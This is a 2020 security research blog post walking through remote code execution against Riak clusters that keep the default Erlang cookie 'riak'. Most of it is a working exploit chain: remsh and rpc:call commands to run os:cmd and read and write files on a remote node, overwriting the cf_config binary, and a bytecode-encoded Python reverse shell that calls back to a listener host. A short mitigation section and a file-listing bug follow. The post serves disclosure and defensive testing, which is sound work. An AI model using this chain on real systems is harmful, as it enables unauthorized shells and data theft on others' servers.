Original post date: 2020-12-21

## What is Riak

[Riak](https://riak.com/products/riak-kv/index.html) is a NoSQL key-value database that is built to maximize data availability and performance, especially in big data environments. It lives by the principles described in Amazon's Dynamo [paper](https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf) which later produced DynamoDB. It was released back in 2009 around the same time as Redis, but it was written in Erlang and really focuses on [high availablity](https://docs.riak.com/riak/kv/latest/learn/why-riak-kv/index.html).

At the core, it was designed to survive data or network failures. Running as a cluster, it's nodes are in constant communication. It exposes a REST API listening on localhost for stats, cluster info and various functions, as well as a local Protobuf service, but the main focus of this research is exploiting default auth mechanisms in the inter-node communication.

We're going to skip ahead to the breaking part, but if you'd like to pause and go read about Riak cluster internals, Erlang distributed architecture, etc then feel free to check out the [References](#references) below and blaze through some documentation first.

## Local Exploitation

Let's first check if riak is running on the local server by using the Erlang Port Mapper Daemon to list the names of running services.

```
$ epmd -names
epmd: up and running on port 4369 with data:
name riak at port 43451
```

By default, riak uses a cookie authentication for nodes with a cookie value of **riak**. 

```
$ ps -aux | grep cookie
/opt/riak/rel/riak/bin/riak -scl false -sfwi 500 -P 256000 -e 256000 -Q 262144 -A 64 -K true -W w -Bi -zdbbl 32768 
... -config ./releases/3.0/sys.config -setcookie riak
```

The cookie is a shared secret between nodes and clients. It can be set either on the CLI or *~/.erlang.cookie*. We can pass the cookie value to the Erlang client, connect to the node and call functions such as **os:cmd()** with the powerful remsh (Erlang remote shell /w REPL) interface.

```
$ erl -name test@localhost -setcookie riak -remsh riak@127.0.0.1
(riak@127.0.0.1)1> os:cmd("id;pwd").
"uid=1000(user) gid=1000(user) groups=1000(user)\n/opt/riak/rel/riak\n"
```

We can see that Riak must be running under the *user* account.

[This](https://broot.ca/erlang-remsh-is-dangerous.html) article explains all things remsh and Erlang's other interesting security notes and a great introduction is also available on the awesome Insinuator [blog](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/).

## Remote Exploitation

So the next logical step was to try this from another host and see if we could execute commands remotely. After configuring the node name and updating /etc/hosts on the remote host to ensure name resolution, it immediately replied with... **pound sand**.

```
$ erl -name test@ubuntu.test -setcookie riak -remsh riak@ubuntu.test
(riak@ubuntu.test)1> os:cmd("id;pwd").
*** ERROR: Shell process terminated! (^G to start new job) ***
```

Huh? Something was preventing us from doing a remote remsh.

But what if, instead of trying to use the erl client directly, another riak node entirely was setup with the same default cookie. Maybe the key here is to talk node-to-node instead of client-to-node, using the riak client (with it's special sauce), that way one could use it's functions like eval to call functions by way of RPC calls on the remote node.

```
$ riak eval "rpc:call('riak@ubuntu.test', os, cmd, [id])."
"uid=1000(user) gid=1000(user) groups=1000(user)\n"
```

```
$ ......... "rpc:call('riak@ubuntu.test', os, cmd, [“id;pwd”])."
escript: exception error: no match of right hand side value
```

**Bingo**...*ish*!

Apparently it doesn't like spaces, special characters or even trying other syntax, hmm. We executed a single command, which is cool but we defintely strive for more shell action then that.

So let's try a few other things.

**Alternate single command execution**

```
> "erlang:spawn('riak@ubuntu.test', os, cmd, ["id"])."
<9718.14141.56>

(exec-notify running locally on the server to observe execution)

pid=3874367 executed [id ]
```

But that still only gets us a single command :'(

**Read files and list dirs, but only in the current directory**

```
> "rpc:call('riak@ubuntu.test', file, read_file, ["test"])."
```

```
> "rpc:call('riak@ubuntu.test', file, list_dir, ["log"])."
{ok,["console.log","crash.log.0",...]}
```

**(Over)write files in current directory**

```
> "rpc:call('riak@ubuntu.test', file, write_file, ["test123", []])."
```

**Change the current working directory (up only)**

```
> "rpc:call('riak@ubuntu.test', file, set_cwd, ["etc"])."
```

```
> "rpc:call('riak@ubuntu.test', os, cmd, ["ls"])."
"advanced.config\ndata\nlog\nriak.conf\n"
```

Also `file:delete_d_r`, `file:make_symlink`, `heart:set_cmd` and `os:putenv` but most either have character restrictions or failed otherwise during testing.

So we can only run one command with no args, no paths and the executable must be in `$PATH`. How can we get a (reverse) shell with a single command? We're definitely going to need some help from the Riak environment itself.

## Full exploit chain

1. Find a useful path that we can pivot up into

```
> rpc:call('riak@ubuntu.test', os, cmd, ["env"]).
"...\nPATH=/opt/riak/rel/riak/erts-10.6.4/bin:/opt/riak/rel/riak/bin:/opt/riak/.local/bin:/usr/local/sbin:
/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

**/opt/riak/rel/riak/bin**

- Check our current path

```
> rpc:call('riak@ubuntu.test', os, cmd, ["pwd"]).
"/opt/riak/rel/riak\n"
```

2. Change into the bin folder which is in our `$PATH`

```
> rpc:call('riak@ubuntu.test', file, set_cwd, ["bin"]).
```

3. Find an executable in bin that "we won’t miss"

```
> rpc:call('riak@ubuntu.test', os, cmd, ["ls"]).
"cf_config\ncuttlefish\ndata\nhooks\ninstall_upgrade.escript\nlog\nnodetool...
```

![cf_config](https://i.ibb.co/yf98t6p/cfconfig.jpg)

4. Craft our payload and overwrite the executable file

(perhaps also call copy on the executable beforehand to save the original)

Ouch, simply passing “id” to file:write_file results in *{error,badarg}*. We need to pass actual Erlang bytecode!?

```
> rpc:call('riak@ubuntu.test', file, write_file, ["cf_config", [105,100]]).
```

So 105=*i* and 100=*d*. Yep.

- Verify the file for good measure

```
> rpc:call('riak@ubuntu.test', file, read_file, ["cf_config"]).
{ok,<<"id">>}
```

We're good! Well, almost...

So obviously writing file data in Erlang bytecode by hand is "super fun". But don't worry, *estr2bc.py* (search on [packetstorm](https://packetstormsecurity.com)) was created to map your payload strings to bytecode automatically, making it painless.

Ok, let’s skip the PoC proving we can execute multiple commands and go straight to the shell!

- Modify the options on a standard payloads-all-the-things reverse shell and pass it to the helper app

```
> estr2bc.py "python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.100\",
5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

[112,121,116,104,111,110,32,45,99,32,39,105,109,112,111,114,116,32,115,111,99,107,101,116,44,115,117,98,112,114,
111,99,101,115,115,44,111,115,59,115,61,115,111,99,107,101,116,...]
```

5. Start our listener for the shell and execute the payload

```
> rpc:call('riak@ubuntu.test', os, cmd, ["cf_config"]).
```

```
$ nc -l -p 5555
...
user@ubuntu:~/opt/riak/rel/riak/bin$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

**We now have RCE as the Riak running user**

![yes chad](https://i.ibb.co/92vJZqq/chad.png)

Recap for shell from a single command + navigating paths + calling functions

- Execute `env` for check our current path
- Call `set_cwd` to `bin` to adjust path
- Select the `cf_config` executable in `bin` to overwrite
- Generate bytecode payload and replace `cf_config`
- Run the new `cf_config`

Whew, that was a fun one!

And while these specifics apply to exploiting Riak, I'd imagine writing payloads in Erlang's [BEAM](https://en.wikipedia.org/wiki/BEAM_(Erlang_virtual_machine)) bytecode would be a primitive for other Erlang services as well. Also, the running user for Riak in this example was just a standard account, but it could easily be root or other privileged users depending on how it's setup and deployed.

# Testing

If you come across EPMD/4369, install erlang on your box and check to see if there's any interesting Erlang services running on the server. You could try and leak the cookie, try default ones or even try and brute force it. erl, remsh and rpc:call() are your friends.

Erlang itself is very intresting from a security perspective-- see some of the references below for more details.

# Mitigation

Change the default cookie to something of sufficiently length and random (like the way RabbitMQ [does it](https://www.rabbitmq.com/clustering.html#erlang-cookie)).

See **distributed_cookie** in riak.conf

Maybe it's possible to whitelist nodes with `net_kernel.allow()`? There seems to be some [chatter](https://stackoverflow.com/questions/34868476/elixir-distributed-security-and-whitelisting-allowed-nodes) around on that.

# Bonus

Using the riak tool and the admin function, one can browse the local filesystem (with whichever privileges the running Riak server has) by triggering a funny bug in how config keys are processed.

```
$ riak admin describe test
Invalid config keys: test
```

```
$ riak admin describe \*
Invalid config keys: Desktop Documents Downloads Music Pictures Public Templates Videos
```

```
$ riak admin describe /var/*
Invalid config keys: /var/backups /var/cache /var/crash /var/lib /var/local /var/lock /var/log /var/mail
/var/metrics /var/opt /var/run /var/snap /var/spool /var/tmp /var/www
```

# References

- https://docs.riak.com/riak/kv/latest/learn/why-riak-kv/index.html
- https://www.monitis.com/blog/an-overview-of-riak-an-open-source-nosql-database/
- https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf
- http://erlang.org/doc/man/
- https://www.rabbitmq.com/clustering.html#erlang-cookie
- https://broot.ca/erlang-remsh-is-dangerous.html
- https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
- https://c0decafe.de/tools/epmd_bf-0.1.tar.bz2
- https://docs.riak.com/riak/kv/latest/using/security/basics/index.html#security-checklist
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://gist.githubusercontent.com/iNarcissuss/4809c725eb04b070f439d9c6df28cdd7/raw/e1902a16a8eeffec43a44c868e203e922dfdcd41/exec-notify.c
- https://stackoverflow.com/questions/34868476/elixir-distributed-security-and-whitelisting-allowed-nodes
- https://www2.slideshare.net/seancribbs/introduction-to-riak-red-dirt-ruby-conf-training
- https://en.wikipedia.org/wiki/BEAM_(Erlang_virtual_machine)
- https://elixirforum.com/t/how-to-get-the-binary-representation-of-a-module/18006
